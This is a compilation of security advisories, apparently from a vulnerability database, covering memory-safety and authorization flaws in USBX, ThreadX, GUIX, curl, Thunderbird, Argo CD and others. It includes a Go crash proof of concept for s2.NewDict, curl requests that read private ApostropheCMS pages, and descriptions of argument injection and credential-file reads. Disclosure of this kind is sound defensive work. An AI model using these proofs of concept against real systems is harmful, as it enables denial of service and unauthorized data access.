title: A HID report descriptor is a sequence of items, each declaring in its header how many data bytes follow.
desc:
A HID report descriptor is a sequence of items, each declaring in its header how many data bytes follow. The USBX host walks that sequence by advancing over each header and parsing the data behind it.



The walk checked that an item fitted in the descriptor only **after** it had advanced past the header and parsed the payload, and the item analysis it relied on never measured the declared sizes against the bytes actually received. A HID peripheral returning a short report descriptor therefore drove a heap out-of-bounds read during ordinary enumeration.

title: A VideoStreaming interface reports the size of its whole class-specific descriptor block in the `wTotalLength` field of its input header.
desc:
A VideoStreaming interface reports the size of its whole class-specific descriptor block in the `wTotalLength` field of its input header. The USBX host recorded that figure and used it as the budget for walking the format, frame and frame-interval descriptors, without holding it against the configuration descriptor actually received.



A device that reports a `wTotalLength` larger than the descriptors it supplies therefore had its own claim believed. Once the real bytes ran out the walk kept going, dereferencing the cursor past the end of the configuration buffer, in the host's context, whenever the application queried format or frame data.

title: A malicious USB MTP/PTP device can cause the USBX host to read past a heap buffer during ordinary object enumeration, leaking adjacent heap contents to the application or…
desc: A malicious USB MTP/PTP device can cause the USBX host to read past a heap buffer during ordinary object enumeration, leaking adjacent heap contents to the application or faulting on an unmapped page.

title: Missing authorization in the configuration cascade operations of the Collaboration Server in Unblu inc.
desc:
Missing authorization in the configuration cascade operations of the Collaboration Server in Unblu inc. Unblu Spark 7.0 through 8.36.1-hotfix.0, on on-premises and cloud deployments, allows an authenticated remote attacker to read and change configuration properties of entities they aren't authorized to access, including other users, other accounts and, in Unblu Cloud, other customers' accounts, via configuration read and write operations that target those entities.



The Collaboration Server doesn't check whether the user reading or changing configuration has access to the entity the configuration belongs to. With certain non-default configuration validation settings, a registered user can additionally write configuration properties they aren't allowed to edit, in any scope.



Exploitation requires an authenticated session but no user interaction.

desc: An issue in nvbn thefuck v.3.32 allows a local attacker to execute arbitrary code via the get_rules_import_paths in thefuck/corrector.py and Rule.from_path in thefuck/types.py

title: A memory-protected ThreadX module's queue request reaches the Module Manager's dispatch layer, which decides how much of the module's buffer the privileged queue copy may touch…
desc:
A memory-protected ThreadX module's queue request reaches the Module Manager's dispatch layer, which decides how much of the module's buffer the privileged queue copy may touch and hands that extent to the module port's range check. A queue's `tx_queue_message_size` is a count of `ULONG`s and the copy moves that many words, so the extent is `message_size * sizeof(ULONG)` bytes.



The front-send dispatcher passed the word count itself. `tx_queue_send` and `tx_queue_receive`, either side of it in the same header, have always multiplied.



A source buffer ending `message_size` bytes into memory the module may read was therefore accepted, and `_txe_queue_front_send` then read `message_size * sizeof(ULONG)` bytes from it in privileged mode — `3 * message_size` bytes past the end of what the module is allowed to read. The words are written into the queue's message area, so a module that can receive from that queue reads them back.

title: The Cortex-A7 MMU Modules port validates a caller-supplied buffer by translating **one address** — the first byte.
desc:
The Cortex-A7 MMU Modules port validates a caller-supplied buffer by translating **one address** — the first byte. The common Module Manager hands its range check the module instance, the start address and the complete byte size; the Cortex-A7 implementation discarded the instance and the size and asked the MMU a single question about the start.



A memory-protected module therefore passed any range whose first byte was user-readable, however far the rest of it reached. Privileged dispatch code then read or wrote the whole range. Because every protected-module dispatcher that consumes a buffer or an extra-parameter array goes through this one macro, the defect is not in any individual service: it is in the primitive all of them rely on.

title: One logical thread of a user-mode ThreadX module costs the Module Manager's shared object pool two allocations, not one.
desc:
One logical thread of a user-mode ThreadX module costs the Module Manager's shared object pool two allocations, not one. The module asks for a `TX_THREAD` control block through `txm_module_object_allocate`; `_txm_module_manager_thread_create` then takes a second allocation of `TXM_MODULE_KERNEL_STACK_SIZE` bytes for the privileged kernel stack that thread's system calls run on, and records it in the control block. Both come from `_txm_module_manager_object_pool` and both are linked onto the module's allocation list.



The Module Manager's thread-delete dispatcher released only the first. The kernel stack stayed allocated until the whole module was stopped, so a module that creates, terminates and deletes threads in a loop — every state transition valid, every service returning `TX_SUCCESS` — removed a fixed block from a finite pool shared by the manager and by every other loaded module, on every cycle, for as long as it stayed loaded. Once the pool is exhausted, no memory-protected module can create any kernel object and no user-mode module thread can be created anywhere in the system.



Vulnerable function: `_txm_module_manager_tx_thread_delete_dispatch`, in `common_modules/module_manager/inc/txm_module_manager_dispatch.h`.

title: A ThreadX module chooses `object_size` when it calls `txm_module_object_allocate`.
desc: A ThreadX module chooses `object_size` when it calls `txm_module_object_allocate`. The Module Manager adds its own 16-byte private header to that size and asked the object pool for the result **without checking the addition**. A size near the top of a `ULONG` wrapped, the pool served a block far smaller than the header, and the manager then wrote the header past the end of it and into the neighbouring byte-pool block.

title: libcurl could accidentally return a URL for `curl_easy_getinfo()`'s `CURLINFO_EFFECTIVE_URL` option containing credentials, even though neither the URL provided to libcurl nor…
desc:
libcurl could accidentally return a URL for `curl_easy_getinfo()`'s
`CURLINFO_EFFECTIVE_URL` option containing credentials, even though neither
the URL provided to libcurl nor the redirected URL did.

title: When processing an HTTP redirect to a URL containing userinfo (a `username:password` component), curl might erroneously retain and re-transmit the original host's HTTP Negotiate…
desc:
When processing an HTTP redirect to a URL containing userinfo (a
`username:password` component), curl might erroneously retain and re-transmit
the original host's HTTP Negotiate authentication state. Consequently, a
malicious server can trigger a redirect containing arbitrary userinfo to force
curl to send a freshly minted Kerberos ticket—generated using the ambient
identity of the client process to an untrusted third-party host, effectively
bypassing the domain-scoping restrictions normally enforced by the absence of
`--location-trusted`.

title: The Module Manager's block-pool create dispatcher proved that two `ALIGN_TYPE` words of the extra-parameter array a memory-protected module supplies lay inside the module's data…
desc:
The Module Manager's block-pool create dispatcher proved that two `ALIGN_TYPE` words of the extra-parameter array a memory-protected module supplies lay inside the module's data, and then used indices 0 through 3 of that array.



One of the two unproved words is read by the dispatcher's own buffer check, which takes index 1 as the pool start and index 2 as the length to range-check it over. So the out-of-bounds read is performed by the validation code itself, before the kernel service is reached, and the size the caller's pool start is then validated against is a word the manager has not proved the module owns. The other unproved word is read when the service's argument list is built.



Vulnerable function: `_txm_module_manager_tx_block_pool_create_dispatch`, in `common_modules/module_manager/inc/txm_module_manager_dispatch.h`.

title: A ThreadX module allocates the control blocks of its kernel objects from the Module Manager's object pool, and can ask for that memory back by address with…
desc: A ThreadX module allocates the control blocks of its kernel objects from the Module Manager's object pool, and can ask for that memory back by address with `txm_module_object_deallocate`. The manager released it whatever was in it, including a control block the kernel was still using. Deallocation is not deletion: the object stays on the created list for its type, a thread stays wherever it was on the ready or suspension lists and stays schedulable, and an active timer stays on the timer list. The byte pool is meanwhile free to hand those same bytes to the next allocation.

title: The Module Manager's object lookup validated one byte of a memory-protected module's search name and then walked as much of it as the module declared, in privileged mode, with…
desc:
The Module Manager's object lookup validated one byte of a memory-protected module's search name and then walked as much of it as the module declared, in privileged mode, with the kernel's preemption count raised. Both lookup dispatchers are affected: the recommended `txm_module_object_pointer_get_extended` is handed a length and does not use it to bound the buffer, and the deprecated `txm_module_object_pointer_get` supplies the largest value a `UINT` can hold, so it removes the bound rather than lacking one.



A module can make the walk unbounded without knowing anything about the memory it reaches, and where the walk reaches memory a privileged read cannot take, the resulting fault leaves the kernel unable to preempt for the rest of the system's life.



Vulnerable functions: `_txm_module_manager_txm_module_object_pointer_get_dispatch`, `_txm_module_manager_txm_module_object_pointer_get_extended_dispatch` (both in `common_modules/module_manager/inc/txm_module_manager_dispatch.h`) and `_txm_module_manager_object_name_compare` (`common_modules/module_manager/src/txm_module_manager_util.c`).

title: A ThreadX module reaches a kernel object's delete service through the Module Manager's dispatch layer, which asked one question about the pointer: does the object lie outside the…
desc:
A ThreadX module reaches a kernel object's delete service through the Module Manager's dispatch layer, which asked one question about the pointer: does the object lie outside the module's own code and data. That is the policy for *using* an object, and using an object a module does not own is supported and intended — `txm_module_object_pointer_get_extended` searches the system's created objects by name and hands back objects the application created and objects other modules created, so that a module can send to a shared queue, take a shared semaphore or get a shared mutex.



Destroying one of those is not sharing it. A module could name any object it had a pointer to and have the privileged dispatcher delete it.

title: The Web add-on's HTTP server dereferences and releases an uninitialized pointer when it detects a `Content-Length` underflow while processing a `PUT` request.
desc: The Web add-on's HTTP server dereferences and releases an uninitialized pointer when it detects a `Content-Length` underflow while processing a `PUT` request. The condition is reachable by an unauthenticated remote client with a single malformed request.

title: The DiviGear Carousel plugin for WordPress is vulnerable to Stored Cross-Site Scripting via...
desc: The DiviGear Carousel plugin for WordPress is vulnerable to Stored Cross-Site Scripting via update_license AJAX Action in all versions up to, and including, 5.2.0 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with subscriber-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. The injected payload executes when an administrator visits the DiviGear > Activation settings page, where the unsanitized stored value is echoed unescaped into a single-quoted HTML value attribute.

title: The X.509 parser in NetX Secure accepts an RSA public key of any size, but every signature-verification path decrypts into fixed-size buffers dimensioned for the…
desc:
The X.509 parser in NetX Secure accepts an RSA public key of any size, but every signature-verification path decrypts into fixed-size buffers dimensioned for the `NX_CRYPTO_MAX_RSA_MODULUS_SIZE` default of 4096 bits. A certificate carrying a larger modulus drives an out-of-bounds write past a file-scope static during ordinary certificate-chain verification.



It is reachable pre-authentication. The issuer used for the crypto operation is looked up in the remote, peer-supplied store before the trusted store, so the attacker supplies the oversized key themselves as an intermediate in the chain they present. It triggers on a TLS or DTLS client verifying a malicious server's chain, and on a server performing client-certificate authentication.

title: Incomplete cleanup vulnerability in Apache Tomcat could cause TLS 1.3 connections to fail intermittently.
desc:
Incomplete cleanup vulnerability in Apache Tomcat could cause TLS 1.3 connections to fail intermittently.



This issue affects Apache Tomcat: from 11.0.0-M21 through 11.0.26, from 10.1.25 through 10.1.60, from 9.0.90 through 9.0.122.



Users are recommended to upgrade to version 11.0.27, 10.1.61 or 9.0.123, which fix the issue.

title: The Web add-on's HTTP server searches the entire request packet for header fields instead of stopping at the end of the header section.
desc: The Web add-on's HTTP server searches the entire request packet for header fields instead of stopping at the end of the header section. A header field name placed in the request body is therefore reported to the server as though it were a header, which lets a client control request framing decisions it should not be able to reach.

title: The TLS 1.3 Certificate-message parser in NetX Secure decrements the message length to skip a context byte without first establishing that the message has a byte to skip.
desc:
The TLS 1.3 Certificate-message parser in NetX Secure decrements the message length to skip a context byte without first establishing that the message has a byte to skip. A zero-length Certificate message therefore wraps the unsigned length to `0xFFFFFFFF`, which makes the bounds check that follows vacuous and sends the parser reading past the session packet buffer.



The trigger is a four-byte handshake header and requires no cryptographic validity. It is reachable pre-authentication.

title: A missing bounds check in the TLS 1.3 Certificate-message parser of NetX Secure lets a malicious TLS 1.3 server trigger an unsigned-integer underflow and a subsequent heap…
desc: A missing bounds check in the TLS 1.3 Certificate-message parser of NetX Secure lets a malicious TLS 1.3 server trigger an unsigned-integer underflow and a subsequent heap out-of-bounds read in any peer that processes a remote Certificate message. It is reachable pre-authentication, during the normal handshake, before certificate verification completes.

title: A service account with user-management permissions in one organization can read, modify, disable or delete users belonging to other organizations on the same Grafana instance…
desc: A service account with user-management permissions in one organization can read, modify, disable or delete users belonging to other organizations on the same Grafana instance through the SCIM API (insecure direct object reference). Only Grafana Enterprise instances with SCIM enabled are affected.

title: The GUIX software JPEG decoder reads four kinds of marker segment without checking that each is long enough to hold what it reads.
desc: The GUIX software JPEG decoder reads four kinds of marker segment without checking that each is long enough to hold what it reads. A truncated segment is therefore read past the end of the caller's image buffer. Separately, a zero chroma sampling factor makes the block decode loop non-terminating. Both reproduce in the default configuration, in which `GX_SOFTWARE_DECODER_SUPPORT` is enabled.

title: `_gx_binres_pixelmap_table_load()` in the GUIX binary resource (theme) loader indexes the pixelmap table with a value read verbatim from the resource file and never bounds it…
desc:
`_gx_binres_pixelmap_table_load()` in the GUIX binary resource (theme) loader indexes the pixelmap table with a value read verbatim from the resource file and never bounds it against the table size. A crafted theme drives a write of up to roughly 256 KB past the end of the table.



The overflowed buffer is allocated by GUIX itself, through `_gx_system_memory_allocator`, rather than supplied by the caller, so the loader corrupts its own arena. The public API `gx_binres_theme_load()` takes no size parameter, so no amount of caller diligence prevents this.



Reproduces in the shipped default configuration; `GX_BINARY_RESOURCE_SUPPORT` is enabled by default.

title: `gx_binres_theme_load()` and `gx_binres_font_load()` take the resource as a bare `GX_UBYTE *` with no length, and `GX_BINRES_DATA_INFO` has no field to carry one.
desc:
`gx_binres_theme_load()` and `gx_binres_font_load()` take the resource as a bare `GX_UBYTE *` with no length, and `GX_BINRES_DATA_INFO` has no field to carry one. Every read is therefore performed at an offset the file itself chose, against a buffer whose extent the loader does not know. A resource that declares more data than it contains is read past its end, and an offset stored in the file is turned into a pointer without being bounded.



This is a distinct defect from GHSA-hgcj-22cg-4hfv, which was an underflowed glyph count. It needs no underflow and no wrapped multiply: a perfectly well-formed, narrow glyph range reaches it.

title: A deeply nested multipart MIME structure constructed via the public API causes a stack overflow in libcurl during normal cleanup operations.
desc:
A deeply nested multipart MIME structure constructed via the public API causes
a stack overflow in libcurl during normal cleanup operations. An excessive
recursion depth within `curl_mime_free` leads to unbounded stack frame
allocation during structure traversal, ultimately crashing the host process.

title: When invoked with `--remote-header-name` (`-J`), curl fails to preserve its documented anti-clobbering protection if an intermediate 103 Early Hints response precedes the final…
desc:
When invoked with `--remote-header-name` (`-J`), curl fails to preserve its
documented anti-clobbering protection if an intermediate 103 Early Hints
response precedes the final HTTP response, or if an `ETag` header is processed
before `Content-Disposition` under `--etag-save`. This flaw allows an HTTP(S)
server to overwrite an existing local file specified in the
`Content-Disposition` header despite the presence of the `-J` non-overwrite
constraint.

title: libcurl's TFTP state machine fails to validate state transitions against the requested transfer direction, accepting opening server responses for both reads and writes…
desc:
libcurl's TFTP state machine fails to validate state transitions against the
requested transfer direction, accepting opening server responses for both
reads and writes interchangeably. A malicious TFTP server can respond to a
download request in a way that forces the client into transmit mode, prompting
libcurl to consume and transmit data from the handle's persistent
`CURLOPT_READDATA` pointer - including data remaining from unrelated prior
operations, such as an HTTP POST request executed on a reused handle.

title: When an FTP wildcard `LIST` operation fails, libcurl omits the restoration path meant for successful listings, leaving the write callback set to the internal listing parser and…
desc:
When an FTP wildcard `LIST` operation fails, libcurl omits the restoration
path meant for successful listings, leaving the write callback set to the
internal listing parser and the write callback data pointing directly to the
easy handle. Subsequent reuse of this handle triggers an immediate crash, and
cloning it via `curl_easy_duphandle()` copies this corrupted state into the
duplicate. If the original handle is subsequently freed, executing a transfer
on the cloned handle causes a heap use-after-free read against the dangling
handle reference; alternatively, reusing the original or cloned handle while
changing only  `CURLOPT_WRITEDATA` (and omitting `CURLOPT_WRITEFUNCTION`)
results in type confusion, forcing the internal parser to interpret incoming
server response bytes into memory at the application-supplied write data
pointer.

title: By permanently omitting the final control-response line, a malicious FTP, IMAP, POP3, or SMTP server can exploit libcurl and completely bypass its configured transfer timeout…
desc:
By permanently omitting the final control-response line, a malicious FTP,
IMAP, POP3, or SMTP server can exploit libcurl and completely bypass its
configured transfer timeout mechanism, indefinitely blocking all concurrent
transfers bound to the same multi-handle.

title: When writing a long cookie name and value to a Netscape cookie jar, a remote HTTP server can make `curl` write a record that exceeds its line-length parsing limit.
desc:
When writing a long cookie name and value to a Netscape cookie jar, a remote
HTTP server can make `curl` write a record that exceeds its line-length
parsing limit. Consequently, any subsequent `curl` invocation reading from
that same cookie jar using `--cookie` silently aborts parsing prematurely upon
encountering the too long line, ignoring all subsequent valid cookies in the
file.

title: Pass-through of unvalidated KMS URLs to KMS clients in Apache C++ Parquet and PyArrow versions 4.0.0 to 25.0.1.
desc:
Pass-through of unvalidated KMS URLs to KMS clients in Apache C++ Parquet and PyArrow versions 4.0.0 to 25.0.1.




This affects users who read Parquet files and configure Parquet decryption properties with a KmsClient implementation.




On the reader side, the KMS URL can be application-controlled (specified in the KmsConnectionConfig) or file-controlled.
If the user does not leverage application control for this parameter, a file-controlled KMS URL is forwarded to a pluggable KmsClient implementation. 
If the KMS implementation does not perform host validation and makes use of the provided KMS URL, a KMS token can be sent to a malicious host set by an attacker in the file. 




Users are recommended to upgrade to version 26.0.0, which disables this behavior by default and requires that users opt-in to it by enabling the read_kms_url flag in the DecryptionConfiguration. Users of affected versions are recommended to either specify the KMS URL in the KmsConnectionConfig when reading files, or ensure any KmsClient implementations validate received KMS URLs. Users that opt-in to file-controlled KMS URLs in version 26.0.0 and later must ensure KmsClients validate KMS URLs.

title: Flatpak is a system for building, distributing, and running sandboxed desktop applications on Linux.
desc: Flatpak is a system for building, distributing, and running sandboxed desktop applications on Linux. Prior to version 1.18.1, on systems where at least one OCI remote is configured (most common on Fedora systems), a malicious local user in an active local session could use a crafted architecture name to trick the `flatpak-system-helper` process into creating a root-owned directory tree with contents determined by the OCI remote, plus a root-owned `lock` file and `icons` directory, outside the intended root directory. If this vulnerability is combined with other vulnerabilities also fixed in 1.18.1, the combination can lead to local root privilege escalation. This particular vulnerability is not believed to be exploitable if there are no OCI remotes configured (common on non-Fedora systems). Version 1.18.1 patches the issue.

title: The GUIX binary resource loader never checks that a font page's glyph range is well formed.
desc:
The GUIX binary resource loader never checks that a font page's glyph range is well formed. `gx_page_header_first_glyph` and `gx_page_header_last_glyph` are read verbatim from the file and only the upper bound of `last_glyph` is validated, so a page declaring `first_glyph > last_glyph` makes `last - first + 1` underflow to a very large unsigned count.



That count is multiplied by a glyph record size to reserve the load buffer, and the multiply is unchecked, so it wraps to a small value and the loader allocates a buffer far smaller than the data it is about to write. The load pass then recomputes the count in a narrower type and writes attacker-controlled glyph records into the undersized buffer.

title: The PNG chunk reader has no notion of chunk ordering.
desc:
The PNG chunk reader has no notion of chunk ordering. It records whether an IDAT has been seen and whether a tRNS has already supplied transparency, but nothing prevents an IHDR being read a second time.



A PNG carries exactly one IHDR and it is the first chunk. A file that places a second one after IDAT rewrites the image width, height, bit depth and pixel depth *after* the decoded-data buffer has already been allocated and filled from the original values. The pass that reverses the PNG row filters then derives its own extent from the new dimensions and walks the old allocation, moving image bytes past the end of it.



The buffer is allocated by GUIX rather than supplied by the caller, so the application has no way to size it defensively. The decoder is compiled in by default.

title: The GUIX JPEG software decoder enforces no ordering on JPEG markers.
desc:
The GUIX JPEG software decoder enforces no ordering on JPEG markers. A file that places a second `SOF0` frame header after `SOS` re-runs the frame header parser after the output buffer has already been allocated and its geometry latched. The decoder returns `GX_SUCCESS` and publishes a `GX_PIXELMAP` whose reported dimensions and `data_size` exceed the allocation behind it.



Any consumer that trusts the returned structure reads out of bounds, including GUIX's own display drivers, reached through the ordinary draw path.



Reproduces in the shipped default configuration; `GX_SOFTWARE_DECODER_SUPPORT` is enabled by default.

title: Compress/s2: Integer Overflow or Wraparound and Out-of-bounds Write in compress
desc:
# Signed Integer Overflow in s2.NewDict

## Summary

A signed integer overflow vulnerability in `s2.NewDict()` allows an attacker to bypass repeat index validation by supplying a dictionary with a uvarint-encoded repeat value exceeding `MaxInt64`. When `Dict.Encode()` is subsequently called, the overflowed negative repeat value causes an out-of-bounds memory access via `unsafe.Pointer` arithmetic, crashing the process with SIGSEGV.

## Package

- **Name:** `github.com/klauspost/compress/s2`
- **Ecosystem:** Go
- **Affected versions:** <= v1.18.6 (all versions with `NewDict` function)

## Severity

**High (7.5)** — CVSS v3.1: `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

## Vulnerability

### Type
- CWE-190: Integer Overflow or Wraparound
- CWE-787: Out-of-bounds Write (via unsafe.Pointer)

### Description

The `NewDict()` function reads a uvarint from dictionary data and converts it to `int`:

```go
r, n := binary.Uvarint(dict)
// ...
d.repeat = int(r)
if d.repeat > len(dict) {
    return nil
}
```

When `r` exceeds `MaxInt64` (9223372036854775807), `int(r)` overflows to a negative value. Since a negative number is never greater than a positive length, the validation check is bypassed.

When `Dict.Encode()` is called, the negative `repeat` value causes an integer overflow in `encodeBlockDictGo()`:

```go
repeat := len(dict.dict) - dict.repeat  // overflows: 62 - (-5758978476775341977) = huge positive
candidate := len(dict.dict) - repeat + s // underflows to negative
load32(dict.dict, candidate)             // OOB via unsafe.Pointer
```

`load32` calls `le.Load32` which uses `unsafe.Pointer` arithmetic without bounds checking:

```go
func Load32[I Indexer](b []byte, i I) uint32 {
    return *(*uint32)(unsafe.Add(unsafe.Pointer(unsafe.SliceData(b)), i))
}
```

This causes a segmentation fault (SIGSEGV) when the negative index is dereferenced.

## PoC

```go
package main

import (
    "encoding/binary"
    "fmt"
    "github.com/klauspost/compress/s2"
)

func main() {
    var dictData []byte
    buf := make([]byte, binary.MaxVarintLen64)
    n := binary.PutUvarint(buf, 12687765596934209639) // > MaxInt64
    dictData = append(dictData, buf[:n]...)
    dictData = append(dictData, make([]byte, 16)...) // minimum dict size

    dict := s2.NewDict(dictData)
    // dict is non-nil despite invalid repeat value (overflow bypassed validation)

    src := make([]byte, 64)
    for i := range src { src[i] = byte(i) }
    dict.Encode(nil, src) // SIGSEGV: OOB access via unsafe.Pointer
}
```

## Impact

- **Denial of Service:** The process crashes immediately with SIGSEGV

## Attack Vector

Any application that:
1. Accepts user-supplied S2 dictionary data via `s2.NewDict()`
2. Calls `Dict.Encode()` on any data ≥32 bytes

## Suggested Fix

Validate the uvarint value before converting to int:

```go
if r > math.MaxInt64 {
    return nil
}
d.repeat = int(r)
```

Or use `uint` for the repeat field and validate against `uint(len(dict))`.

## References

- Source: `s2/dict.go` lines 59-61 (vulnerability), `s2/encode_all.go` line 947 (crash site)
- Commit: 539243b (v1.18.6 + 4 commits)

title: Cross-site scripting in the embedded co-browsing feature in Unblu inc.
desc:
Cross-site scripting in the embedded co-browsing feature in Unblu inc. Unblu Spark 7.0 through 7.57.7 and 8.0 through 8.39.2, on on-premises and cloud deployments, allows an unauthenticated remote attacker in the visitor role to execute arbitrary JavaScript in the browser of an agent taking part in the attacker's co-browsing session, via content of the co-browsed page that the agent's browser renders as HTML.



The JavaScript runs in the context and under the identity of the agent's session in the Agent Desk or the Single Conversation Desk.



Exploitation requires an agent to join an embedded co-browsing session with the attacker. Mobile co-apping isn't affected.

title: Enumeration of unauthenticated users in FacturaScripts, version 2025.61.
desc: Enumeration of unauthenticated users in FacturaScripts, version 2025.61. The application returns different responses when attempting to log in with a valid username compared to an invalid one. An unauthenticated attacker could systematically identify valid usernames by examining variations in the application’s responses, such as changes in response time, discrepancies between error messages or differences in HTTP status codes. A successful exploit allows the attacker to compile a list of valid user accounts. This list could be used to carry out targeted brute-force attacks, password spraying, credential stuffing or social engineering campaigns against the confirmed accounts.

Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the victim’s browser (the application user) or to escalate privileges from a normal user to an administrator by executing specially crafted JavaScript code, thereby compromising the system’s confidentiality or hijacking the session (even with httpOnly cookies by extracting CSRF tokens).

title: When Thunderbird asked for a security device password (for example a smartcard PIN or the Primary Password) while decrypting an S/MIME message, the message load could finish or…
desc: When Thunderbird asked for a security device password (for example a smartcard PIN or the Primary Password) while decrypting an S/MIME message, the message load could finish or be cancelled while the prompt was open. This freed the message decoder while it was still in use, causing a use-after-free and a potentially exploitable crash. This vulnerability was fixed in Thunderbird 158.0.1 and Thunderbird 153.6.

title: When authenticating to a POP3 or SMTP server using NTLM, Thunderbird did not check whether the server's challenge was valid base64.
desc: When authenticating to a POP3 or SMTP server using NTLM, Thunderbird did not check whether the server's challenge was valid base64. A malicious server could send a challenge that caused Thunderbird to include uninitialized heap memory in its NTLM response, disclosing that memory to the server. A challenge consisting only of base64 padding also caused an out-of-bounds read, crashing Thunderbird. This affected accounts configured to use NTLM or GSSAPI authentication. The uninitialized memory disclosure only affected NTLM. This vulnerability was fixed in Thunderbird 158.0.1 and Thunderbird 153.5.1.

title: Thunderbird did not escape attribute values when serializing outgoing XMPP stanzas.
desc: Thunderbird did not escape attribute values when serializing outgoing XMPP stanzas. Because values from incoming requests were echoed back in automatic replies, a remote XMPP user could send a crafted request that caused Thunderbird to inject arbitrary stanzas into the user's connection, which the server would then process as if sent by the user. This could be used to send messages or change contact and subscription settings on behalf of the user, without any interaction. This bug only affects Thunderbird's chat feature with XMPP accounts. This vulnerability was fixed in Thunderbird 158.0.1 and Thunderbird 153.5.1.

title: When setting up an account, Thunderbird's Exchange AutoDiscover lookup also queried the domain's AutoDiscover service over plain HTTP.
desc: When setting up an account, Thunderbird's Exchange AutoDiscover lookup also queried the domain's AutoDiscover service over plain HTTP. Due to a bug, that unencrypted request included the credentials the user had entered, allowing a network attacker to obtain the user's password. This vulnerability was fixed in Thunderbird 158.0.1 and Thunderbird 153.5.1.

title: Bulwark Webmail is a self-hosted webmail client for Stalwart Mail Server.
desc: Bulwark Webmail is a self-hosted webmail client for Stalwart Mail Server. Prior to 1.9.2, the unauthenticated POST /api/fetch-ical endpoint validates a caller-supplied hostname with one DNS lookup and then passes the URL to fetch, which performs a separate lookup for the socket connection. An attacker controlling authoritative DNS can return a public address during validation and then rebind the hostname to a loopback, private, link-local, or cloud metadata address for the connection, causing the server to return up to 10 MB of an internal HTTP or HTTPS response. The same check-then-fetch pattern also existed in authenticated JMAP login and TOTP token-exchange flows. This issue is fixed in version 1.9.2.

An attacker with a valid authenticated session can submit repeated guesses for the current password without receiving a lockout or throttle response. This issue is fixed in version 4.33.0.

title: Argo CD is a declarative, GitOps continuous delivery tool for Kubernetes.
desc: Argo CD is a declarative, GitOps continuous delivery tool for Kubernetes. From 2.1.0 until 3.3.15, 3.4.10, 3.5.4, and 3.6.0-rc2, when an operator has enabled --enable-helm for kustomize build, helmGlobals.configHome can point Helm's config and data directories at a repository-controlled location. Helm automatically loads a downloader plugin from `<configHome>/.data/plugins` without a separate plugin-install step and executes its program inside argocd-repo-server when a helmCharts repository URL uses the plugin's protocol. The command runs as the repo-server user and can read repository credentials and other process-accessible data. An attacker can commit the Kustomization and plugin to a Git repository that an Application builds or upload the files through POST /api/v1/applications/manifestsWithFiles, also exposed by argocd app diff --local --server-side-generate. The upload path requires only Application get permission on an existing Application, without Application update or sync permission or repository write access. Both delivery paths require prior operator enablement of --enable-helm; deployments that do not enable it are not affected. Kustomize 4.1.0 first passed helmGlobals.configHome through to Helm. This issue is fixed in versions 3.3.15, 3.4.10, 3.5.4, and 3.6.0-rc2.

title: Argo CD is a declarative, GitOps continuous delivery tool for Kubernetes.
desc: Argo CD is a declarative, GitOps continuous delivery tool for Kubernetes. From 2.7.0 until 3.3.15, 3.4.10, 3.5.4, and 3.6.0-rc2, Kustomize passes ref or version query values from remote resource, base, or component URLs to git fetch without an end-of-options separator. A leading-hyphen value can be parsed as --upload-pack and execute a command inside argocd-repo-server when the remote uses a local transport such as file://. Git does not run the supplied command for an https:// remote. The local transport does not leave the pod, so blocking repo-server egress does not prevent the execution. The command runs as the repo-server user, can read repository credentials and other process-accessible data, and can return output through manifest-generation errors. An attacker can commit a Kustomization to a Git repository that an Application builds or upload files through POST /api/v1/applications/manifestsWithFiles, also exposed by argocd app diff --local --server-side-generate. The upload path requires only Application get permission on an existing Application, without Application update or sync permission or repository write access. Kustomize 5.0.0 introduced acceptance of file://, whereas 4.5.7 rejects that transport; replacing the affected Kustomize with a newer version alone does not correct the missing option separator. This issue is fixed in versions 3.3.15, 3.4.10, 3.5.4, and 3.6.0-rc2.

title: Argo CD is a declarative, GitOps continuous delivery tool for Kubernetes.
desc: Argo CD is a declarative, GitOps continuous delivery tool for Kubernetes. From 0.9.0 until 3.3.15, 3.4.10, 3.5.4, and 3.6.0-rc2, the repo-server evaluates .jsonnet files with an importer that does not confine import, importstr, or importbin to the repository root. Absolute paths, parent-directory traversal, and repository symlinks can open any file readable by the repo-server, including /proc/self/environ, projected service-account tokens, mounted private keys, and repository credentials. Although generated Secrets are redacted, placing imported contents in a ConfigMap returns the data to the caller. Using importstr on a non-terminating device such as /dev/zero can exhaust repo-server memory. An attacker can commit a .jsonnet file to a Git repository used by an Application or upload the file through POST /api/v1/applications/manifestsWithFiles, also exposed by argocd app diff --local --server-side-generate. Directory applications evaluate every .jsonnet file in the application directory. The upload path requires only Application get permission on an existing directory Application, without Application update or sync permission or repository write access. This issue is fixed in versions 3.3.15, 3.4.10, 3.5.4, and 3.6.0-rc2.

title: ApostropheCMS: Page REST API authorization bypass
desc:
**Summary**
The core page REST API reads full page documents with `.permission(false)` in `getOne` and in the `all=1` tree dump, bypassing page-type `viewRole`, `visibility: private`, and `visibility: loginRequired` checks. Unauthenticated visitors and low-privilege contributors can read admin-only and non-public page content by `_id`/slug.

**Details**
`packages/apostrophe/modules/@apostrophecms/page/index.js`:
- `getOne` (L456–465): `await self.publicApiCheckAsync(req); ... self.getRestQuery(req).permission(false).and(criteria)` — no `viewRole` threshold, no `visibility` filtering.
- `all` handler (L318–395): `getRestQuery(req).permission(false)` (L384–385) walks every page type and returns the projection including `visibility`.
- `publicApiCheckAsync` (L3044) only checks that `publicApiProjection` exists — it performs no authorization.
- Correct control behaves differently: `piece-type/index.js:getOne` (L319–327) uses `getRestQuery(req)` without `.permission(false)` and enforces `viewRole`.

**PoC**
```
# Anonymous (no session) — private, admin-only page:
curl "http://localhost:3100/api/v1/@apostrophecms/page/d576242ve1dkzb12jiiabujd:en:published"
# → 200  {"_id":"...:en:published","title":"Secret Private Page","slug":"/secret-page",
#         "type":"private-type","visibility":"private","secretData":"TOP-SECRET-VALUE-abc123"}

# Anonymous full site-map dump (includes private + loginRequired pages):
curl "http://localhost:3100/api/v1/@apostrophecms/page?all=1"        # → 200, full tree

# Contributor (cont_admin) reads full admin-only doc incl. protected field:
curl -b contrib.cookies ".../api/v1/@apostrophecms/page/d576242ve1dkzb12jiiabujd:en:published"
# → 200  secretData = TOP-SECRET-VALUE-abc123
# Controls (correctly enforced):
curl -b contrib.cookies ".../api/v1/@apostrophecms/page?type=private-type&autocomplete=zz"   # → 403
curl -b contrib.cookies ".../api/v1/@apostrophecms/page/d576242ve1dkzb12jiiabujd:en:draft"   # → 403
```

**Impact**
